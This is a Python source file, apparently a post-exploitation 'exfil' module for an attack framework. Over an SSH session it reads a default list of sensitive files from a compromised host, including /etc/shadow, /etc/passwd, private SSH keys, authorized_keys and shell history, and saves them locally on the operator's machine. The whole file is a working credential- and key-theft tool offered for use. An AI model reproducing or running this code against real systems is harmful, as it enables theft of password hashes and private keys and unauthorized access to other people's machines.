"""
File retrieval module.

Retrieve specific files from the remote host and save them locally.
"""

import os
from typing import Dict, Any, List
from modules.postexploit.base_module import BaseModule


class FileRetrievalModule(BaseModule):
    """Retrieve files from remote host."""
    
    _name = "fileretrieve"
    
    def __init__(self, ssh_session, target_files: List[str] = None, output_dir: str = "output/retrieved_files"):
        """
        Initialize the file retrieval module.
        
        Args:
            ssh_session: SSH session to use
            target_files: List of file paths to retrieve
            output_dir: Local directory to save retrieved files
        """
        super().__init__(ssh_session)
        self.target_files = target_files or [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/group",
            "/etc/hosts",
            "~/.bash_history",
            "~/.ssh/id_rsa",
            "~/.ssh/id_rsa.pub",
            "~/.ssh/authorized_keys",
            "~/.ssh/config"
        ]
        self.output_dir = output_dir
    
    @property
    def name(self) -> str:
        return "fileretrieve"
    
    @property
    def description(self) -> str:
        return "Retrieve specific files from the remote host"
    
    @property
    def category(self) -> str:
        return "exfil"
    
    async def run(self) -> Dict[str, Any]:
        """
        Retrieve files from the remote host.
        
        Returns:
            Dictionary with retrieval results
        """
        hostname = self.get_hostname()
        self.log_info(f"Starting file retrieval from {hostname}")
        
        try:
            # Create output directory
            host_output_dir = os.path.join(self.output_dir, hostname)
            os.makedirs(host_output_dir, exist_ok=True)
            
            results = {
                'success': True,
                'hostname': hostname,
                'data': {
                    'retrieved': [],
                    'failed': [],
                    'output_dir': host_output_dir
                }
            }
            
            for file_path in self.target_files:
                try:
                    # Expand ~ to home directory
                    expanded_path = file_path
                    if file_path.startswith('~'):
                        expanded_path = await self.execute_command(f"echo {file_path}")
                        expanded_path = expanded_path.strip()
                    
                    # Check if file exists and is readable
                    check_cmd = f"test -r {expanded_path} && echo 'readable' || echo 'not_readable'"
                    check_result = await self.execute_command(check_cmd)
                    
                    if 'readable' in check_result:
                        # Retrieve file content
                        content = await self.execute_command(f"cat {expanded_path}")
                        
                        # Save to local file
                        # Create subdirectories if needed
                        local_file_path = os.path.join(host_output_dir, expanded_path.lstrip('/'))
                        local_file_dir = os.path.dirname(local_file_path)
                        os.makedirs(local_file_dir, exist_ok=True)
                        
                        with open(local_file_path, 'w') as f:
                            f.write(content)
                        
                        results['data']['retrieved'].append({
                            'remote_path': expanded_path,
                            'local_path': local_file_path,
                            'size': len(content)
                        })
                        self.log_success(f"Retrieved {expanded_path}")
                    else:
                        results['data']['failed'].append({
                            'path': expanded_path,
                            'reason': 'not_readable'
                        })
                        self.log_info(f"Cannot read {expanded_path} (may not exist or no permissions)")
                
                except Exception as e:
                    results['data']['failed'].append({
                        'path': file_path,
                        'reason': str(e)
                    })
                    self.log_warning(f"Failed to retrieve {file_path}: {e}")
            
            self.log_success(f"File retrieval complete: {len(results['data']['retrieved'])} files retrieved, {len(results['data']['failed'])} failed")
            return results
            
        except Exception as e:
            self.log_error(f"File retrieval failed: {e}")
            return {
                'success': False,
                'hostname': hostname,
                'error': str(e),
                'data': {}
            }
